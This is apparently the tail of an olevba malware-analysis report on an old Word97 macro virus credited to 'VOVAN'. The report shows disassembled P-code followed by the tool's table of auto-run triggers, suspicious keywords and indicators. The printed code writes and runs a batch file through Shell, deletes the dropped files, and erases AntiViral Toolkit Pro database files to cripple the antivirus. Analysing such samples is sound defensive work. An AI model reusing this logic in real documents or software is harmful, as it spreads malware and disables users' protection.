' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "debug < OFF.SCR"
' 	PrintItemNL 
' Line #210:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #211:
' 	LitStr 0x000B "C:\WINDOWS\"
' 	ArgsCall ChDir 0x0001 
' Line #212:
' 	LitStr 0x0012 "C:\WINDOWS\OFF.BAT"
' 	LitDI2 0x0000 
' 	ArgsCall Shell 0x0002 
' Line #213:
' 	Dim 
' 	VarDefn PauseTime
' 	VarDefn Start
' 	VarDefn Finish
' Line #214:
' 	LitDI2 0x000A 
' 	St PauseTime 
' Line #215:
' 	Ld Timer 
' 	St Start 
' Line #216:
' 	Ld Timer 
' 	Ld Start 
' 	Ld PauseTime 
' 	Add 
' 	Lt 
' 	DoWhile 
' Line #217:
' 	ArgsCall DoEvents 0x0000 
' Line #218:
' 	Loop 
' Line #219:
' 	Ld Timer 
' 	St Finish 
' Line #220:
' 	LitStr 0x000B "C:\WINDOWS\"
' 	ArgsCall ChDir 0x0001 
' Line #221:
' 	LitStr 0x0012 "C:\WINDOWS\OFF.BAT"
' 	ArgsCall Kill 0x0001 
' Line #222:
' 	LitStr 0x0012 "C:\WINDOWS\OFF.SCR"
' 	ArgsCall Kill 0x0001 
' Line #223:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError AVP 
' Line #224:
' 	LitStr 0x002C "C:\Program Files\AntiViral Toolkit Pro\*.avc"
' 	ArgsCall Kill 0x0001 
' Line #225:
' 	LitStr 0x001B "Äóěŕ îňďđŕâëĺíŕ â îňńňŕâęó!"
' 	St StatusBar 
' Line #226:
' 	Label AVP 
' Line #227:
' 	End 
' Line #228:
' 	EndSub 
' Line #229:
' 	QuoteRem 0x0000 0x0027 "***************************************"
' Line #230:
' 	QuoteRem 0x0000 0x0027 "* Author of given MacroVirus is VOVAN *"
' Line #231:
' 	QuoteRem 0x0000 0x0027 "*         MacroVirus.Word97           *"
' Line #232:
' 	QuoteRem 0x0000 0x0027 "*      Name of President virus        *"
' Line #233:
' 	QuoteRem 0x0000 0x0027 "*             Ver 1.0                 *"
' Line #234:
' 	QuoteRem 0x0000 0x0027 "***************************************"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |OFF.SCR             |Executable file name                         |
|IOC       |OFF.BAT             |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

